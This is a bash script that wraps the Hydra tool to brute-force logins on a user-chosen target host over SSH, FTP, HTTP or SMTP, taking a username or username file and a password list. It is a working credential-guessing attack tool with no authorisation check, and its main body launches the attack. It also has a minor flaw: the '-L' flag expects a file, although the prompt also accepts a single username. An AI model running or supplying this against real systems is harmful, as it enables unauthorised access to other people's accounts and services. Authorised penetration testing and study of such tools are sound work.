#!/bin/bash


CONFIG_PATH="$(dirname "$0")/../config/config.sh"
if [ -f "$CONFIG_PATH" ]; then
    source "$CONFIG_PATH"
else

    COLOR_RESET="\e[0m"
    COLOR_RED="\e[31m"
    COLOR_GREEN="\e[32m"
    COLOR_CYAN="\e[36m"
    COLOR_MAGENTA="\e[35m"
fi


function loading_icon() {
    local load_interval="${1}"
    local loading_message="${2}"
    local elapsed=0
    local loading_animation=( '—' "\\" '|' '/' )

    echo -n "${loading_message} "

    tput civis  # Hide the cursor
    trap "tput cnorm" EXIT  # Ensure cursor is restored on exit
    while [ "${load_interval}" -ne "${elapsed}" ]; do
        for frame in "${loading_animation[@]}" ; do
            printf "%s\b" "${frame}"
            sleep 0.2
        done
        elapsed=$(( elapsed + 1 ))
    done
    printf " \b\n"
}


if ! command -v hydra &> /dev/null; then
    echo -e "${COLOR_RED}Error: Hydra is not installed.${COLOR_RESET}"
    echo "Please install Hydra before running this script."
    exit 1
fi







read -p "Enter the target IP or hostname: " target
if [ -z "$target" ]; then
    echo -e "${COLOR_RED}Error: No target provided.${COLOR_RESET}"
    exit 1
fi

# Prompt user for the service to attack
echo -e "${COLOR_CYAN}Choose the service to attack:${COLOR_RESET}"
echo -e  " \e[96m1) ssh\033[0m "
echo -e " \e[96m2) ftp\033[0m "
echo -e " \e[96m3) http\033[0m "
echo -e " \e[96m4) smtp\033[0m "
read -p "Enter the number corresponding to the service: " service_choice

case $service_choice in
    1)
        service="ssh"
        ;;
    2)
        service="ftp"
        ;;
    3)
        service="http"
        ;;
    4)
        service="smtp"
        ;;
    *)
        echo -e "${COLOR_RED}Invalid choice. Please select a valid service.${COLOR_RESET}"
        exit 1
        ;;
esac


read -p "Enter the username (or path to a file with usernames): " username


read -p "Enter the path to the password list: " password_list
if [ -z "$password_list" ]; then
    echo -e "${COLOR_RED}Error: No password list provided.${COLOR_RESET}"
    exit 1
fi


if [ ! -f "$password_list" ]; then
    echo -e "${COLOR_RED}Error: Password list file not found at '$password_list'.${COLOR_RESET}"
    exit 1
fi


loading_icon 3 "Running Hydra..."


hydra -L "$username" -P "$password_list" "$target" "$service"


echo -e "${COLOR_GREEN}Hydra has completed its run.${COLOR_RESET}"


echo -e "${COLOR_RESET}"

